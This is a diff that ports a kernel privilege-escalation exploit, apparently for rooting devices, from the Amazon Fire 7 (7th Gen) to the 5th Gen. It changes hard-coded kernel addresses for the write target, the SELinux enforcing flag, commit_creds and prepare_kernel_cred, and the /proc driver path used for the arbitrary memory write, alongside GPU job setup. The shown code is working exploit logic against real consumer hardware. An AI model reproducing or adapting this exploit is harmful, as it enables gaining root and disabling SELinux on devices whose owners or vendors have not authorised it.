@@ -143,14 +143,14 @@ static const uint32_t fragment_shader[] = {
 };
 
 // target stuff
-#define TARGET_KERNEL_VA   0xC0867AA8	// what we wanna write (not used)
-#define TARGET_PHYS_ADDR   0x80867000   // page-aligned physical address
-#define TARGET_PAGE_OFFSET 0x6CC        // offset within page we wanna write
+#define TARGET_KERNEL_VA   0xc086b8f4	// what we wanna write (not used)
+#define TARGET_PHYS_ADDR   0x8086b000   // page-aligned physical address
+#define TARGET_PAGE_OFFSET 0x518        // offset within page we wanna write
 
 //useful addresses
-#define ENFORCING_ADDR	   0xc0c8afb4
-#define COMMIT_CREDS	   0xc007ebb4
-#define PREPARE_KERNEL_CRED 0xc007ef58
+#define ENFORCING_ADDR	   0xc0c820b0
+#define COMMIT_CREDS	   0xc00837a0
+#define PREPARE_KERNEL_CRED 0xc0083b44
 
 // GPU VA layout
 #define GPU_VA_DATA    0x40000000   /* PP job data (PLB, RSW, shader) */
@@ -198,7 +198,7 @@ void important_ascii_art() {
     printf("\033[38;5;46m");
     printf("██   ██  ██████  ██   ██    ██    \n");
     printf("\033[0m");
-	printf("\n\033[38;5;34m    Amazon Fire 7 (7th Gen)\033[0m\n\n");
+	printf("\n\033[38;5;34m    Amazon Fire 7 (5th Gen)\033[0m\n\n");
 }
 
 int main(void)
@@ -352,7 +352,7 @@ int main(void)
 		printf("[+] PP finished: status=0x%08x (%s)\n", st, job_status_str(st));
 
 		// open the device we use to do the memory write
-		const char *proc_path = "/proc/driver/wmt_aee";
+		const char *proc_path = "/proc/driver/wmt_dbg";
 		int aee_fd = open(proc_path, O_RDONLY);
 		if (aee_fd < 0) {
 			printf("[-] open %s: %s\n", proc_path, strerror(errno));
